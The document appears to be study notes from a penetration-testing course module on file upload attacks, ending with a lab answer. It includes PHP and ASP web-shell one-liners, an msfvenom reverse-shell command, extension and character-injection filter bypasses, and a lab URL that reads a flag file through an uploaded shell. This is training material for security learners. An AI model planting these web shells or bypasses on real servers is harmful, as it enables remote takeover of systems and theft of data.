# Intro to File Upload Attacks
Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.
However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.

## Types of File Upload Attacks

The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload` vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, as we will see in this module, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks.

The most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. A web shell, as we will discuss in the next section, allows us to execute any command we specify and can be turned into an interactive shell to enumerate the system easily and further exploit the network. It may also be possible to upload a script that sends a reverse shell to a listener on our machine and then interact with the remote server that way.

In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.

Examples of these attacks include:
- Introducing other vulnerabilities like `XSS` or `XXE`.
- Causing a `Denial of Service (DoS)` on the back-end server.
- Overwriting critical system files and configurations.
- And many others.

## Commands
|**Web Shell**|**Description**|
|---|---|
|`<?php file_get_contents('/etc/passwd'); ?>`|Basic PHP File Read|
|`<?php system('hostname'); ?>`|Basic PHP Command Execution|
|`<?php system($_REQUEST['cmd']); ?>`|Basic PHP Web Shell|
|`<% eval request('cmd') %>`|Basic ASP Web Shell|
|`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`|Generate PHP reverse shell|
|[PHP Web Shell](https://github.com/Arrexel/phpbash)|PHP Web Shell|
|[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)|PHP Reverse Shell|
|[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)|List of Web Shells and Reverse Shells|

## Bypasses

|**Command**|**Description**|
|---|---|
|**Client-Side Bypass**||
|`[CTRL+SHIFT+C]`|Toggle Page Inspector|
|**Blacklist Bypass**||
|`shell.phtml`|Uncommon Extension|
|`shell.pHp`|Case Manipulation|
|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)|List of PHP Extensions|
|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)|List of ASP Extensions|
|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)|List of Web Extensions|
|**Whitelist Bypass**||
|`shell.jpg.php`|Double Extension|
|`shell.php.jpg`|Reverse Double Extension|
|`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`|Character Injection - Before/After Extension|
|**Content/Type Bypass**||
|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)|List of Web Content-Types|
|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)|List of All Content-Types|
|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)|List of File Signatures/Magic Bytes|

## Limited Uploads

| **Potential Attack** | **File Types**          |
| -------------------- | ----------------------- |
| `XSS`                | HTML, JS, SVG, GIF      |
| `XXE`/`SSRF`         | XML, SVG, PDF, PPT, DOC |
| `DoS`                | ZIP, JPG, PNG           |

# Questions & Answers
### Absent Validation
1.  Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.
```
Create basic php webshell ->  <?php system($_REQUEST['cmd']); ?>

upload it, then go to
/uploads/shell.php?=cmd=andheretypecommands

http://94.237.59.199:54252/uploads/shell.php?cmd=cat+/flag.txt
```

